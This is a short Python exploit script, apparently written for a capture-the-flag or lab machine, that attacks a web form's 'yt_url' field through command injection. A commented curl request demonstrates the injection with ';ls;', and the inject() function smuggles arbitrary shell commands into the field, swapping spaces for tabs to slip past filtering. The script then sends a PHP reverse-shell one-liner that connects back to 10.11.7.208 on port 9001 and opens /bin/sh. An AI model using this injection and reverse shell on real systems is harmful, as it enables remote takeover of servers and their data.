#!/usr/bin/python3

import requests
import re
import json

'''
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.22.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.22.217/' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 11' -H $'Origin: http://10.10.22.217' -H $'Connection: close' -H $'DNT: 1' \
    --data-binary $'yt_url=;ls;' \
    $'http://10.10.22.217/'
'''

url = 'http://10.10.22.217/'

def inject(cmd):
	cmd = cmd.replace(' ', '\t')
	print("Executing '{}'".format(cmd))

	header = {
		'X-Requested-With': 'XMLHttpRequest'
	}

	data = {
		"yt_url" : ';{};#'.format(cmd)
	}

	resp = requests.post(url, headers=header, data=data)
	res = json.loads(resp.content.decode())
	return res["output"]


cmd = """
php -r '$sock=fsockopen("10.11.7.208",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
"""
print(inject(cmd))